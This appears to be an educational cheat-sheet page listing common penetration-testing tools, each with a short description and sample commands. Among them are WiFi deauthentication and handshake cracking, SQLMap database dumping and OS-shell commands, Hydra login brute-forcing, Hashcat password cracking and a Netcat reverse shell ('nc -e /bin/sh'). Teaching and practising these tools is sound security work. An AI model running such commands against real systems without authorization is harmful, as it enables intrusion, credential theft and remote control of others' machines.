WiFi Hacking & Wireless Security

Learn wireless network security protocols including WPA/WPA2/WPA3 handshake capture, deauthentication attacks, PMKID cracking, and rogue access point deployment. Understand how wireless data packets are transmitted and secured.

Key concepts: Monitor mode, packet injection, handshake cracking using dictionary attacks, and wireless intrusion detection.

// ESSENTIAL COMMANDS

iwconfig airmon-ng start wlan0 airodump-ng mon0 airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w cap mon0 aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX mon0 aircrack-ng -w wordlist.txt cap-01.cap

Wireshark & Network Forensics

Become proficient in packet capture and traffic analysis. Filter HTTP streams, extract credentials sent over plaintext, dissect DNS queries, and detect anomalous network behavior.

Topics: Display filters, follow TCP stream, PCAP export, and CLI traffic capture with tshark and tcpdump.

// ESSENTIAL COMMANDS

wireshark tshark -i eth0 -w capture.pcap tshark -r capture.pcap -Y "http.request" tcpdump -i eth0 -w capture.pcap

Feroxbuster (Directory Brute-Forcing)

High-speed, recursive directory and file discovery written in Rust. Locate hidden endpoints, backup files, and unlinked admin portals on web servers efficiently.

Covers: Custom wordlists, status code filtering, thread tuning, recursive depth scanning, and extension probing.

// ESSENTIAL COMMANDS

feroxbuster -u http://target.com -w wordlist.txt feroxbuster -u http://target.com -w list.txt -x php,txt,json feroxbuster -u http://target.com -w list.txt --recursive

Cryptography & Fernet Symmetric Encryption

Master AES-128 encryption in CBC mode with HMAC-SHA256 signature verification using Python's Fernet library. Secure data at rest and build confidential communication channels.

Topics: Key generation, key management, token encryption, and cryptographic payload building.

// PYTHON EXAMPLES

from cryptography.fernet import Fernet key = Fernet.generate_key() cipher = Fernet(key) token = cipher.encrypt(b"NEXO-TECH SECRET") decrypted = cipher.decrypt(token)

Nmap Network Scanner

The definitive host discovery and vulnerability scanner. Perform stealth SYN scans, OS detection, service version auditing, and execute custom Lua scripts via Nmap Scripting Engine (NSE).

Features: Firewall evasion, timing templates (-T0 to -T5), UDP scanning, and vuln script auditing.

// ESSENTIAL COMMANDS

nmap -sn 192.168.1.0/24 nmap -sV -O 192.168.1.100 nmap -p 1-65535 --open 192.168.1.100 nmap --script vuln 192.168.1.100

SQLMap Automated Injection

Automate SQL injection detection and database takeover. Extract schema structures, dump database tables, read remote server files, and spawn interactive OS shell prompts.

Techniques: Blind boolean, time-based delay, UNION query, error-based, and stacked queries.

// ESSENTIAL COMMANDS

sqlmap -u "http://target.com?id=1" --dbs sqlmap -u "http://target.com?id=1" -D db_name --tables sqlmap -u "http://target.com?id=1" -D db -T users --dump sqlmap -u "http://target.com?id=1" --os-shell

Hashcat GPU Password Cracking

The world's fastest GPU-accelerated password recovery utility. Perform dictionary, combinator, mask, and hybrid attacks against hundreds of hash algorithm formats.

Supported: MD5, SHA256, NTLM, WPA/WPA2 handshakes, bcrypt, Argon2, and PDF/ZIP passwords.

// ESSENTIAL COMMANDS

hashcat -m 0 -a 0 hashes.txt wordlist.txt hashcat -m 1000 -a 3 ntlm.txt ?a?a?a?a?a?a hashcat -m 2500 -a 0 wpa.hccapx wordlist.txt hashcat --show hashes.txt

Hydra Network Login Cracker

Parallelized network login cracker supporting numerous protocols. Audit weak passwords across SSH, FTP, HTTP forms, RDP, SMB, and database instances.

Features: Multi-threaded connection pools, custom form parsing, proxy routing, and wordlist pairing.

// ESSENTIAL COMMANDS

hydra -l admin -P pass.txt ssh://192.168.1.100 hydra -L users.txt -P pass.txt ftp://192.168.1.100 hydra -l admin -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:Failed"

Netcat (nc) — The Swiss Army Knife

Versatile networking utility used for reading and writing network connections via TCP/UDP. Used for banner grabbing, port listening, raw socket testing, file transfer, and reverse shell handlers.

Capabilities: Listeners, port scanning, raw HTTP requests, and socket relays.

// ESSENTIAL COMMANDS

nc -zv 192.168.1.100 1-1000 nc -lvnp 4444 nc 192.168.1.100 4444 nc -e /bin/sh 192.168.1.100 4444
